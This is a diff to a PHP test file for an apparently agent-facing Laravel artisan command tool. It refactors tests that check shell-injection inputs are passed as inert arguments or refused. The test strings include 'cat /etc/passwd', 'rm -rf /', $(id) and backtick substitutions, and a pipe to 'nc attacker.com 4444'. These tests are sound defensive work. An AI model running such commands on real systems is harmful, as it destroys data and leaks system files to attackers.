@@ -14,6 +14,24 @@ const ARTISAN_ROUTES_OUTPUT = 'routes output';
 const ARTISAN_COMMAND_NOT_FOUND = 'Command not found';
 const ARTISAN_MIGRATE_COMMAND = 'php artisan migrate';
 const ARTISAN_MIGRATE_SEED_COMMAND = 'php artisan migrate --seed';
+const ARTISAN_BACKGROUND_DENIAL = 'Command is not permitted for background execution.';
+const ARTISAN_DENIAL_FRAGMENT = 'not permitted';
+
+/** @param list<string> $expectedArguments */
+function assertArtisanCommandArgv(ArtisanTool $tool, string $command, array $expectedArguments): void
+{
+    Process::fake([
+        '*' => Process::result('ok'),
+    ]);
+
+    $tool->execute(['command' => $command]);
+
+    Process::assertRan(fn ($process): bool => $process->command === [
+        'php',
+        'artisan',
+        ...$expectedArguments,
+    ]);
+}
 
 beforeEach(function () {
     $this->backgroundService = Mockery::mock(BackgroundCommandService::class);
@@ -283,7 +301,7 @@ describe('background execution', function () {
         ]);
 
         expect((string) $result)->toContain('Error')
-            ->and((string) $result)->toContain('not permitted');
+            ->and((string) $result)->toContain(ARTISAN_DENIAL_FRAGMENT);
     });
 
     it('strips prefix before dispatching', function () {
@@ -385,94 +403,43 @@ describe('output format', function () {
 
 describe('command injection resistance', function () {
     it('passes shell metacharacters as inert argv tokens, not shell commands', function () {
-        Process::fake([
-            '*' => Process::result('ok'),
-        ]);
-
-        $this->tool->execute(['command' => 'tinker --execute="echo `whoami`"']);
-
-        Process::assertRan(function ($process) {
-            $cmd = is_array($process->command) ? $process->command : [$process->command];
-
-            // Quotes are consumed by the parser, so the backticks survive as one
-            // inert argv token. Nothing runs them: Process gets an array, no shell.
-            return in_array('tinker', $cmd, true)
-                && in_array('--execute=echo `whoami`', $cmd, true);
-        });
+        assertArtisanCommandArgv(
+            $this->tool,
+            'tinker --execute="echo `whoami`"',
+            ['tinker', '--execute=echo `whoami`'],
+        );
     });
 
     it('does not split on semicolons into separate commands', function () {
-        Process::fake([
-            '*' => Process::result('ok'),
-        ]);
-
-        $this->tool->execute(['command' => 'route:list; cat /etc/passwd']);
-
-        Process::assertRan(function ($process) {
-            $cmd = is_array($process->command) ? $process->command : [$process->command];
-
-            // The semicolon is part of the first token, not a command separator.
-            // 'cat' and '/etc/passwd' are separate argv tokens but they are
-            // arguments to 'php artisan', NOT a second shell command.
-            return in_array('route:list;', $cmd, true)
-                && in_array('cat', $cmd, true)
-                && in_array('/etc/passwd', $cmd, true)
-                && $cmd[0] === 'php'
-                && $cmd[1] === 'artisan';
-        });
+        assertArtisanCommandArgv(
+            $this->tool,
+            'route:list; cat /etc/passwd',
+            ['route:list;', 'cat', '/etc/passwd'],
+        );
     });
 
     it('does not interpret && or || as shell operators', function () {
-        Process::fake([
-            '*' => Process::result('ok'),
-        ]);
-
-        $this->tool->execute(['command' => 'cache:clear && rm -rf /']);
-
-        Process::assertRan(function ($process) {
-            $cmd = is_array($process->command) ? $process->command : [$process->command];
-
-            // && is a literal token, not a shell operator.
-            return in_array('cache:clear', $cmd, true)
-                && in_array('&&', $cmd, true)
-                && in_array('rm', $cmd, true)
-                && in_array('-rf', $cmd, true)
-                && in_array('/', $cmd, true);
-        });
+        assertArtisanCommandArgv(
+            $this->tool,
+            'cache:clear && rm -rf /',
+            ['cache:clear', '&&', 'rm', '-rf', '/'],
+        );
     });
 
     it('does not expand $(...) command substitutions', function () {
-        Process::fake([
-            '*' => Process::result('ok'),
-        ]);
-
-        $this->tool->execute(['command' => 'tinker --execute="$(id)"']);
-
-        Process::assertRan(function ($process) {
-            $cmd = is_array($process->command) ? $process->command : [$process->command];
-
-            // The $(id) must be a literal argv value, not executed.
-            return in_array('--execute=$(id)', $cmd, true);
-        });
+        assertArtisanCommandArgv(
+            $this->tool,
+            'tinker --execute="$(id)"',
+            ['tinker', '--execute=$(id)'],
+        );
     });
 
     it('strips quotes and keeps a quoted value with spaces in one token', function () {
-        Process::fake([
-            '*' => Process::result('ok'),
-        ]);
-
-        // No shell runs, so the parser itself must remove the quotes; otherwise
-        // artisan receives a value that literally contains them.
-        $this->tool->execute(['command' => "migrate --seed --path='database/migrations' --name=\"two words\""]);
-
-        Process::assertRan(function ($process) {
-            $cmd = is_array($process->command) ? $process->command : [$process->command];
-
-            return in_array('migrate', $cmd, true)
-                && in_array('--seed', $cmd, true)
-                && in_array('--path=database/migrations', $cmd, true)
-                && in_array('--name=two words', $cmd, true);
-        });
+        assertArtisanCommandArgv(
+            $this->tool,
+            "migrate --seed --path='database/migrations' --name=\"two words\"",
+            ['migrate', '--seed', '--path=database/migrations', '--name=two words'],
+        );
     });
 
     it('handles unmatched opening quote without crashing', function () {
@@ -507,7 +474,7 @@ describe('background command allowlist security', function () {
     it('rejects shell metacharacters in background commands', function () {
         $this->backgroundService->shouldReceive('dispatch')
             ->once()
-            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));
+            ->andThrow(new InvalidArgumentException(ARTISAN_BACKGROUND_DENIAL));
 
         $result = $this->tool->execute([
             'command' => 'migrate; cat /etc/passwd',
@@ -515,33 +482,33 @@ describe('background command allowlist security', function () {
         ]);
 
         expect((string) $result)->toContain('Error')
-            ->and((string) $result)->toContain('not permitted');
+            ->and((string) $result)->toContain(ARTISAN_DENIAL_FRAGMENT);
     });
 
     it('rejects pipe operators in background commands', function () {
         $this->backgroundService->shouldReceive('dispatch')
             ->once()
-            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));
+            ->andThrow(new InvalidArgumentException(ARTISAN_BACKGROUND_DENIAL));
 
         $result = $this->tool->execute([
             'command' => 'migrate | nc attacker.com 4444',
             'background' => true,
         ]);
 
-        expect((string) $result)->toContain('not permitted');
+        expect((string) $result)->toContain(ARTISAN_DENIAL_FRAGMENT);
     });
 
     it('rejects command substitution in background commands', function () {
         $this->backgroundService->shouldReceive('dispatch')
             ->once()
-            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));
+            ->andThrow(new InvalidArgumentException(ARTISAN_BACKGROUND_DENIAL));
 
         $result = $this->tool->execute([
             'command' => 'migrate $(whoami)',
             'background' => true,
         ]);
 
-        expect((string) $result)->toContain('not permitted');
+        expect((string) $result)->toContain(ARTISAN_DENIAL_FRAGMENT);
     });
 
     it('matches allowlist entries only at a command-namespace boundary', function () {
